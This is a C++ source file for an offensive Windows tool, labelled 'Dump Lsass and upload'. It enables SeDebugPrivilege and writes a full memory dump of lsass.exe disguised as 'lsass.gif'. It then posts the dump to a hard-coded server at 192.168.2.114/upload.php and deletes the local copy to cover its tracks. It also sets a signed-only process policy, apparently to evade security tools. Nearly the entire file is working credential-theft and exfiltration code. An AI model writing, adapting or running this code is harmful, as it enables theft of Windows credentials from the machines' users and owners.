#include <iostream>
#include <Windows.h>
#include <assert.h>
#include <sddl.h>
#include <tchar.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <Dbghelp.h>
#include <Processthreadsapi.h>
#include <curl/curl.h>

#define MAX_NAME 256
#define FILE_NAME "lsass.gif"
#define _WIN32_WINNT 0x0602

using namespace std;

#pragma comment( lib, "Dbghelp.lib" )


int write_data(void* buffer, int size, int nmemb, void* userp) {
	std::string* str = dynamic_cast<std::string*>((std::string*)userp);
	str->append((char*)buffer, size * nmemb);
	return nmemb;

}

void setProcessSignaturePolicy()
{
	bool result;

	
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy = { 0 };
	policy.MicrosoftSignedOnly = 1;

	try {
		result = SetProcessMitigationPolicy(ProcessSignaturePolicy, &policy, sizeof(policy));
	}
	catch (const std::exception& e)
	{
		std::cout << " a standard exception was caught, with message '" << e.what() << "'\n";
	}
	DWORD errorCode = GetLastError();
	if (!result)
	{
		std::cout << L"[!] An error occured. Unable to set process signature policy! Error code is: " << errorCode << std::endl;
	}
	else
	{
		std::cout << "\n[>] Process signature policy was set successfully." << std::endl;
	}
}

bool IsHighIntegrity()
{
	wchar_t HighIntegrity[] = L"S-1-16-12288";
	HANDLE hToken;


	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		std::cout << "Failed to get access token" << std::endl;
		return FALSE;
	}

	DWORD dwSize = 0;
	if (!GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize)
		&& GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		std::cout << "Failed to query the byte size of TokenGroups" << std::endl;
		CloseHandle(hToken);
		return FALSE;
	}


	PTOKEN_GROUPS pTokenGroups = (PTOKEN_GROUPS)GlobalAlloc(GPTR, dwSize);



	if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwSize, &dwSize))
	{
		std::cout << "Failed to retrieve TokenGroups" << std::endl;
		GlobalFree(pTokenGroups);
		CloseHandle(hToken);
		return FALSE;
	}

	for (DWORD i = 0; i < pTokenGroups->GroupCount; ++i)
	{

		wchar_t* pStringSid = NULL;

		
		if (!ConvertSidToStringSid(pTokenGroups->Groups[i].Sid, &pStringSid))
		{
			std::cout << "Failed to convert to string SID" << std::endl;
			continue;
		}
		else
		{
		
			if (!wcscmp(pStringSid, HighIntegrity))
			{
				return TRUE;
			}
			else
			{
				continue;
			}
			LocalFree(pStringSid);
		}
	}

	GlobalFree(pTokenGroups);
	CloseHandle(hToken);

	return FALSE;
}

DWORD GetPID()
{
	HANDLE processes;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	wchar_t lsass[] = L"lsass.exe";

	processes = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!Process32First(processes, &entry))
	{
		std::cout << "Error\n" << std::endl;
		CloseHandle(processes);        
	}
	while (Process32Next(processes, &entry))
	{
		if (!wcscmp(entry.szExeFile, lsass))
		{
			return entry.th32ProcessID;
			break;
		}
	}
}

BOOL SetPrivilege(
	LPCWSTR lpszPrivilege,  
	BOOL bEnablePrivilege  
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	HANDLE hToken = NULL;

	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		if (hToken)
		{
			CloseHandle(hToken);
			return false;
		}
	}

	if (!LookupPrivilegeValue(
		NULL,            
		lpszPrivilege,  
		&luid))       
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[!] AdjustTokenPrivileges error: %u. Exiting...\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[!] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

void Minidump(DWORD lsassPID)
{
	HANDLE lsassHandle;
	bool Dump;
	HANDLE DumpFile;

	DumpFile = CreateFileA(FILE_NAME, GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (DumpFile == INVALID_HANDLE_VALUE)
	{
		DWORD errorCode = GetLastError();
		std::cout << L"[!] Can't create the file! Error code is: " << errorCode << std::endl;
	}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
	if (lsassHandle)
	{
		try
		{
			Dump = MiniDumpWriteDump(lsassHandle, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		}
		catch (const std::exception& e)
		{
			
			DWORD errorCode = GetLastError();
			std::cout << L"[!] An error occured. Unable to dump lsass! Error code is: " << errorCode << std::endl;
		}
		Dump = MiniDumpWriteDump(lsassHandle, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		if (MiniDumpWriteDump(lsassHandle, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL))
		{
			std::cout << "[+] Successfully dumped lsass. Check for lsass.dmp file." << std::endl;
		}
		else
		{
			DWORD errorCode = GetLastError();
			std::cout << L"[!] An error occured. Unable to dump lsass! Error code is: " << errorCode << std::endl;
		}
	}
	else
	{
		std::cout << "[!] Can't open a handle to lsass" << std::endl;
	}

	
	CloseHandle(DumpFile);
}

int upload(string url, string& body, string* response)

{

	CURL* curl;
	CURLcode ret;
	curl = curl_easy_init();

	struct curl_httppost* post = NULL;
	struct curl_httppost* last = NULL;
	struct curl_slist* headlist = NULL;

	headlist = curl_slist_append(headlist, "Content-Type:image/gif");
	headlist = curl_slist_append(headlist, "charset:utf-8");




	if (curl)
	{

		curl_easy_setopt(curl, CURLOPT_URL, (char*)url.c_str());          

		curl_formadd(&post, &last, CURLFORM_PTRNAME, "file", CURLFORM_FILE, "lsass.gif", CURLFORM_FILENAME, "lsass.gif", CURLFORM_END);



		curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);                     //����post����   
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);          //����Ӧ
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)response);        //����Ӧ���ݵĵ�ַ

		ret = curl_easy_perform(curl);                          //ִ������
		if (ret == 0) {
			curl_easy_cleanup(curl);
			return 0;
		}else {
			return ret;
		}
	}else {
		return -1;
	}

}

int main(int argc, char* argv[]) {


	std::cout << "[>]  Dump Lsass and upload." << std::endl;

	std::cout << "[>]  By Lengyi @HongHuSec Lab 2020." << std::endl;



	setProcessSignaturePolicy();


	if (IsHighIntegrity())
	{
		std::cout << "[>] Current process is running under high integrity context." << std::endl;
	}
	else
	{
		std::cout << "[!] No in high integrity context, exiting...\n" << std::endl;
		return 0;
	}

	
	DWORD lsassPID;
	lsassPID = GetPID();
	std::cout << "[>] lsass.exe process ID found: " << lsassPID << std::endl;

	
	if (SetPrivilege(L"SeDebugPrivilege", TRUE))
	{
		std::cout << "[>] SeDebugPrivilege enabled." << std::endl;
	}

	

	//dump lsass
	std::cout << "[>] Trying to dump lsass..." << std::endl;
	Minidump(lsassPID);
	cout << "[>] Lsass.dmp uploading ...." << endl;
	std::string body;
	std::string response;

	int status_code = upload("http://192.168.2.114/upload.php", body, &response);
	
	if (status_code != CURLcode::CURLE_OK) {
		cout << "[>] Lsass.dmp upload Fail." << endl;
		cout << "[>] Removing Lsass.dmp." << endl;
		if (remove(FILE_NAME) == 0) {
			cout << "[>] Remove Lsass.dmp Successful." << endl;
		}
		else
		{
			cout << "[>]  Remove Lsass.dmp Fail." << endl;
		}
		return -1;
	}
	cout << "[>] Lsass.dmp upload Successful." << endl;
	cout << body << endl;
	cout << response << endl;

	cout << "[>] Removing Lsass.dmp." << endl;
	if (remove(FILE_NAME)==0) {
		cout << "[>] Remove Lsass.dmp Successful." << endl;
	}
	else
	{
		cout << "[>]  Remove Lsass.dmp Fail." << endl;
	}

	return 0;
}
